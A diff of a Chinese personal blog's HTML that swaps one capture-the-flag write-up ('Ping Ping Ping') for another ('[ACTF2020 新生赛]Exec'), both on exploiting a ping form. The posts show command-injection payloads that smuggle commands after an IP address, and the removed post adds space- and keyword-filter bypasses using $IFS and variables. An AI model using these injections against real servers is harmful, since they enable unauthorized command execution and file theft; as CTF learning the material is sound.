@@ -3,31 +3,28 @@
 <head>
   <meta charset="utf-8">
   
-  <title>5-buu练习Ping Ping Ping | baba童鞋的博客</title>
+  <title>6-buu练习[ACTF2020 新生赛]Exec | baba童鞋的博客</title>
 
   <!-- keywords -->
   
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="打开题目，界面如下结合题目pingpingping，这应该是个提示且与与linux相关，于是在url后面加上：  ?&#x2F;ip&#x3D;127.0.0.1  发现ping通过了！   接下来管道符ls来查看目录文件名称：  url + &#x2F;?ip&#x3D;127.0.0.1|ls    查看flag.php文件内容： url + &#x2F;?ip&#x3D;127.0.0.1|cat flag.php但是并没有出现flag，而是以下界面">
+  <meta name="description" content="打开题目，发现是ping，和linux有关，首先查看文件：127.0.0.1|ls存在index.php文件，那我们查看该文件：127.0.0.1;cat index.php再查看源代码，如下：没有flag文件，那么flag应该在父目录中，那我们：127.0.0.1|ls ..&#x2F; 直到127.0.0.1|ls ..&#x2F;..&#x2F;..&#x2F;可以看到flag文件那我们查看..&#x2F;..&#x2F;..&#x2F;flag文件：127.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="5-buu练习Ping Ping Ping">
-<meta property="og:url" content="http://example.com/2021/01/19/ping/index.html">
+<meta property="og:title" content="6-buu练习[ACTF2020 新生赛]Exec">
+<meta property="og:url" content="http://example.com/2021/01/20/exec/index.html">
 <meta property="og:site_name" content="baba童鞋的博客">
-<meta property="og:description" content="打开题目，界面如下结合题目pingpingping，这应该是个提示且与与linux相关，于是在url后面加上：  ?&#x2F;ip&#x3D;127.0.0.1  发现ping通过了！   接下来管道符ls来查看目录文件名称：  url + &#x2F;?ip&#x3D;127.0.0.1|ls    查看flag.php文件内容： url + &#x2F;?ip&#x3D;127.0.0.1|cat flag.php但是并没有出现flag，而是以下界面">
+<meta property="og:description" content="打开题目，发现是ping，和linux有关，首先查看文件：127.0.0.1|ls存在index.php文件，那我们查看该文件：127.0.0.1;cat index.php再查看源代码，如下：没有flag文件，那么flag应该在父目录中，那我们：127.0.0.1|ls ..&#x2F; 直到127.0.0.1|ls ..&#x2F;..&#x2F;..&#x2F;可以看到flag文件那我们查看..&#x2F;..&#x2F;..&#x2F;flag文件：127.">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/2021/01/19/ping/ping1.png">
-<meta property="og:image" content="http://example.com/2021/01/19/ping/ping2.png">
-<meta property="og:image" content="http://example.com/2021/01/19/ping/ping3.png">
-<meta property="og:image" content="http://example.com/2021/01/19/ping/ping4.png">
-<meta property="og:image" content="http://example.com/2021/01/19/ping/ping5.png">
-<meta property="og:image" content="http://example.com/2021/01/19/ping/ping6.png">
-<meta property="og:image" content="http://example.com/2021/01/19/ping/ping7.png">
-<meta property="article:published_time" content="2021-01-19T11:06:17.000Z">
-<meta property="article:modified_time" content="2021-01-19T12:00:13.698Z">
+<meta property="og:image" content="http://example.com/2021/01/20/exec/eee1.png">
+<meta property="og:image" content="http://example.com/2021/01/20/exec/eee2.png">
+<meta property="og:image" content="http://example.com/2021/01/20/exec/eee3.png">
+<meta property="og:image" content="http://example.com/2021/01/20/exec/eee4.png">
+<meta property="article:published_time" content="2021-01-20T10:17:01.000Z">
+<meta property="article:modified_time" content="2021-01-20T10:38:11.880Z">
 <meta property="article:author" content="Jialu">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2021/01/19/ping/ping1.png">
+<meta name="twitter:image" content="http://example.com/2021/01/20/exec/eee1.png">
   
     <link rel="alternative" href="/atom.xml" title="baba童鞋的博客" type="application/atom+xml">
   
@@ -179,11 +176,11 @@
 		</header>				
 	</div>
 </nav>
-      <div class="body-wrap"><article id="post-ping" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-exec" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2021/01/19/ping/" class="article-date">
-  	<time datetime="2021-01-19T11:06:17.000Z" itemprop="datePublished">2021-01-19</time>
+      <a href="/2021/01/20/exec/" class="article-date">
+  	<time datetime="2021-01-20T10:17:01.000Z" itemprop="datePublished">2021-01-20</time>
 </a>
     </div>
   
@@ -196,7 +193,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      5-buu练习Ping Ping Ping
+      6-buu练习[ACTF2020 新生赛]Exec
       
     </h1>
   
@@ -214,52 +211,8 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>打开题目，界面如下<br><img src="/2021/01/19/ping/ping1.png"><br>结合题目pingpingping，这应该是个提示且与与linux相关，于是在url后面加上：</p>
-<ul>
-<li>?/ip=127.0.0.1
-</li></ul>
-发现ping通过了！
+        <p>打开题目，发现是ping，和linux有关，首先查看文件：<b>127.0.0.1|ls</b><br><img src="/2021/01/20/exec/eee1.png"><br>存在index.php文件，那我们查看该文件：<b>127.0.0.1;cat index.php</b><br>再查看源代码，如下：<br><img src="/2021/01/20/exec/eee2.png"><br>没有flag文件，那么flag应该在父目录中，那我们：<b>127.0.0.1|ls ../</b> 直到<b>127.0.0.1|ls ../../../</b>可以看到flag文件<br><img src="/2021/01/20/exec/eee3.png"><br>那我们查看../../../flag文件：<b>127.0.0.1|cat ../../../flag</b><br><img src="/2021/01/20/exec/eee4.png"><br>得到flag！<br>（又是爱学习的一天！！）</p>
 
-<p><img src="/2021/01/19/ping/ping2.png"></p>
-<p>接下来管道符ls来查看目录文件名称：</p>
-<ul>
-<li>url + /?ip=127.0.0.1|ls
-</li></ul>
-
-<p><img src="/2021/01/19/ping/ping3.png"></p>
-<p>查看flag.php文件内容： url + /?ip=127.0.0.1|cat flag.php<br>但是并没有出现flag，而是以下界面</p>
-<p><img src="/2021/01/19/ping/ping4.png"></p>
-<p>应该是空格键被过滤掉了<br>过滤空格键的解决办法：将空格替换成“$IFS$1”，（“$1”里的“1”可以是任意数字）：</p>
-<ul>
-<li>url + /?ip=127.0.0.1|cat$IFS$1flag.php
-</li></ul>
-
-<p><img src="/2021/01/19/ping/ping5.png"></p>
-<p>发现flag被过滤了，那么只好查看index.php文件</p>
-<ul>
-<li>url + /?ip=127.0.0.1|cat$IFS$1index.php
-</li></ul>
-文件内容如下：
-
-<p><img src="/2021/01/19/ping/ping6.png"></p>
-<p>发现过滤了好多字符，但是在最后看到了a变量，那么就可以将a的值覆盖掉，来进行绕过</p>
-<ul>
-<li>url + /?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php
-</li></ul>
-查看源代码得到flag！
-
-<p><img src="/2021/01/19/ping/ping7.png"></p>
-<p>————————————<br>盘点一下学到的知识点吧！<br>1、$IFS是bash中的内部域分隔符，可以代替空格。后面的$9数字是可以随意的，每个数字都有特殊含义，但是和前面的搭配都可以表示空格；<br>2、可以解决空格问题的方法：</p>
-<ul>
-<li>{cat,flag.txt}
-</li><li>cat${IFS}flag.txt
-</li><li>cat$IFS$9flag.txt
-</li><li>cat<flag.txt <li>cat<>flag.txt
-<br>这些是linux下巧妙越过空格的方法;
-<br>下面是windows下绕过空格的方法，实用性不强，就type这个命令可以用
-<li>type.\flag.txt
-</li><li>type,flag.txt </li></flag.txt></li></ul>
-<br>（又是被摧残的一天giao！！！）
       
     </div>
     
@@ -268,18 +221,9 @@
     
 <nav id="article-nav">
   
-    <a href="/2021/01/20/exec/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">&lt;</strong>
-      <div class="article-nav-title">
-        
-          6-buu练习[ACTF2020 新生赛]Exec
-        
-      </div>
-    </a>
   
-  
-    <a href="/2021/01/18/bu/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">4-buu练习EasySQL</div>
+    <a href="/2021/01/19/ping/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">5-buu练习Ping Ping Ping</div>
       <strong class="article-nav-caption">&gt;</strong>
     </a>
   
@@ -289,7 +233,7 @@
 </article>
 
 
-<div class="ds-share share" data-thread-key="ping" data-title="5-buu练习Ping Ping Ping" data-url="http://example.com/2021/01/19/ping/"  data-images="/img/huahua.jpg" data-content="5-buu练习Ping Ping Ping">
+<div class="ds-share share" data-thread-key="exec" data-title="6-buu练习[ACTF2020 新生赛]Exec" data-url="http://example.com/2021/01/20/exec/"  data-images="/img/huahua.jpg" data-content="6-buu练习[ACTF2020 新生赛]Exec">
     <div class="ds-share-inline">
       <ul  class="ds-share-icons-16">
       	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
